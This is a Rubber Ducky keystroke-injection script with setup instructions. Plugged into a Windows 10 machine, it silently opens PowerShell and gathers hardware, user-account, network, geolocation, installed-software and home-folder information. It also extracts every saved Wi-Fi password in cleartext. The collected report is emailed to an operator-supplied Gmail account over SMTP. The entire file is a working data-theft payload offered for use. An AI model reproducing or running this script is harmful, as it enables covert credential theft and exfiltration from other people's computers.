REM Zeid Al-Ameedi
REM Gains all possible information from the Win10 OS
REM Follow the algorithm;

REM (1) Edit the script to use your own gmail username and password
REM (2) java -jar duckencoder.jar -i ExtractAllData.txt
REM (3) Copy inject.bin --> Rubber Ducky
REM (4) Plug & Check email


DELAY 3000
GUI r
DELAY 500
STRING powershell.exe
DELAY 50
ENTER
DELAY 500
STRING $Temp=$env:temp
DELAY 50
ENTER
STRING $rand=Get-Random
DELAY 50
ENTER
STRING $F="$Temp\$rand PCINFO.txt"
DELAY 50
ENTER
STRING echo "PC INFORMATION FOR: $env:UserName@$env:USERDOMAIN" > $F
DELAY 50
ENTER
STRING echo "CPU Info:" >> $F
DELAY 50
ENTER
STRING gwmi win32_Processor >> $F
DELAY 50
ENTER
STRING echo "GPU Info:" >> $F
DELAY 50
ENTER
STRING gwmi Win32_VideoController >> $F
DELAY 50
ENTER
STRING echo "RAM Info:" >> $F
DELAY 50
ENTER
STRING gwmi win32_physicalmemory >> $F
DELAY 50
ENTER
STRING echo "Motherboard Info:" >> $F
DELAY 50
ENTER
STRING gwmi Win32_BaseBoard >> $F
DELAY 50
ENTER
STRING echo "User Account Info:" >> $F
DELAY 50
ENTER
STRING gwmi Win32_UserAccount >> $F
DELAY 50
ENTER
STRING echo "ipconfig /all Output:" >> $F
DELAY 50
ENTER
STRING ipconfig /all >> $F
DELAY 50
ENTER
STRING echo "IP Info:" >> $F
DELAY 50
ENTER
STRING $ipfy=iwr -Uri "https://api.ipfy.me/?format=json&geo=true";$IPInfo=$ipfy.content;
DELAY 50
ENTER
STRING $IPInfo | ConvertFrom-Json | ConvertTo-Json >> $F
DELAY 50
ENTER
STRING $WirelessSSIDs = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
DELAY 50
ENTER
STRING $WifiInfo = foreach($SSID in $WirelessSSIDs) {
DELAY 50
ENTER
STRING     $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String 'Key Content') -replace ".*:\s+"
DELAY 50
ENTER
STRING     New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$Password}
DELAY 50
ENTER
STRING }  
DELAY 50
ENTER
STRING echo "WIFI Passwords:" >> $F
DELAY 50
ENTER
STRING $WifiInfo | ConvertTo-Json >> $F
DELAY 50
ENTER
STRING echo "Installed Software:" >> $F
DELAY 50
ENTER
STRING gp HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | select DisplayName, Displ
DELAY 50
STRING ayVersion, Publisher, InstallDate | ConvertTo-Json >> $F
DELAY 50
ENTER
STRING echo "Home folder Directory Structure:" >> $F
DELAY 50
ENTER
STRING tree C:\Users\$env:UserName >> $F
DELAY 50
ENTER
STRING $SMTPServer = 'smtp.gmail.com'
DELAY 50
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
DELAY 50
ENTER
STRING $SMTPInfo.EnableSsl = $true
DELAY 50
ENTER
REM add your gmail username (without the @gmail.com)
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YourUser@gmail.com', 'YourPassword');
DELAY 50
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
DELAY 50
ENTER
REM enter your full gmail address
STRING $ReportEmail.From = 'YourUser@gmail.com'
DELAY 50
ENTER
REM enter your full gmail address again
STRING $ReportEmail.To.Add('YourUser@gmail.com')
DELAY 50
ENTER
STRING $ReportEmail.Subject = 'Duck Report'
DELAY 50
ENTER
STRING $ReportEmail.Body = 'Attached is your duck report.' 
DELAY 50
ENTER
STRING $ReportEmail.Attachments.Add($F)
DELAY 50
ENTER
STRING $SMTPInfo.Send($ReportEmail)
DELAY 50
ENTER
DELAY 1000
STRING exit
DELAY 50
ENTER
DELAY 5000


